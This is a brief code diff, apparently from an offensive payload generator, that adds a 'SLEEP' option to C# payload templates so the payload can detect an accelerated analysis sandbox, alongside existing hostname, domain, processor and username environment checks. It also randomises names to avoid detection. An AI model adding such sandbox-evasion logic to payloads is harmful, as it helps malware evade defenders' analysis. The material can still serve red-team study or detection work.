@@ -45,13 +45,14 @@ class PayloadModule:
                                     "HOSTNAME"       : ["X", "Optional: Required system hostname"],
                                     "DOMAIN"         : ["X", "Optional: Required internal domain"],
                                     "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
-                                    "USERNAME"       : ["X", "Optional: The required user account"]
+                                    "USERNAME"       : ["X", "Optional: The required user account"],
+                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
                                 }
 
     def generate(self):
 
         # imports and namespace setup
-        payload_code = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;\n"
+        payload_code = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices; using System.Threading;\n"
         payload_code += "namespace %s { class %s {\n" % (evasion_helpers.randomString(), evasion_helpers.randomString())
 
         # code for the randomString() function
